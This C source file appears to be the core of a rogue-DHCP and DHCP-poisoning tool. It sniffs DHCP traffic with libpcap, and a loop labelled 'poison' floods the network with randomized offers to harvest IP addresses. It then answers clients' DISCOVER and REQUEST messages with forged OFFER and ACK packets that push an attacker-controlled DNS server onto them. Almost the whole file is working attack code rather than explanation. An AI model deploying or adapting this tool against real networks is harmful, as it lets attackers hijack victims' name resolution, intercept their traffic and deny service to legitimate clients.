#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include<sys/socket.h>
#include<arpa/inet.h>

#include "dhcp.h"

#define BUF_SIZE 65536

#define MY_DNS_SERVER "1.2.3.4"

struct list_ip ips;
int sockfd;

dhcp_header *offer;

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer);


void listen_dhcp(){
	

	pcap_t *handle;
	pcap_if_t *all_dev, *dev;


	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;
	struct bpf_program fp;

	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}



	printf("Please choose the device to snoop :\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 1, err_buf); //to_ms = 1 so that reads timeouts and packets are processed

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	char const filter_exp[] = "udp and port 67 or 68";
	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return;
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return;
	}


	printf("Device %s is opened. Begin sniffing...\n", dev_name);


	//Put the device in sniff loop
	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);

	return;
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));

	dhcp_header *dhcph;
	unsigned int packet_size = fill_dhcp_packet(&dhcph, buffer, size);

	int type = packet_type(dhcph, packet_size);

	switch(type){
		case DHCPDISCOVER:
			//filter packets we are sending 
			
			if(dhcph->xid != ntohl(10)){

				printf("DISCOVER\n");
				if(ips.len == 0){
					printf("No ip address recovered from poisonning !\n");
					return;
				}
				modify_packet_type(dhcph, packet_size, DHCPOFFER);
				dhcph->yiaddr = ips.ips[ips.index++];
				add_dns_server(dhcph, &packet_size);
				send_packet(sockfd, dhcph, packet_size);
			}
			break;
		case DHCPOFFER:
			printf("OFFER, ADDED IP\n");
			if(dhcph->xid == ntohl(10)){
				add_ip(&ips, dhcph->yiaddr);
			}
			break;
		case DHCPREQUEST:
			printf("REQUEST\n");

			modify_packet_type(dhcph, packet_size, DHCPACK);
			dhcph->yiaddr = dhcph->ciaddr;
			dhcph->ciaddr = 0;
			add_dns_server(dhcph, &packet_size);
			send_packet(sockfd, dhcph, packet_size);

			break;
		case DHCPACK:
			printf("ACK\n");
			break;
		default:
			break;
	}
	printf("done\n");
}

void *poison(){
	while(1){
		randomize_offer(offer);
		send_packet_poison(sockfd, offer);
		sleep(1);
	}
}

int main(){
	srand(time(NULL));

	ips.len = 0;
	ips.index = 0;

	//for(int i=0; i<100; i++) add_ip(&ips, 0x09080706);

	sockfd = open_socket();

	offer = (dhcp_header*) malloc(sizeof(dhcp_header));

	fill_offer(offer);
	
	pthread_t thread;

	if(pthread_create(&thread, NULL, poison, NULL)){
		printf("Error creating thread\n");
		return 1;
	}

	listen_dhcp();
	
	free(offer);

	close(sockfd);


	return 0;
}
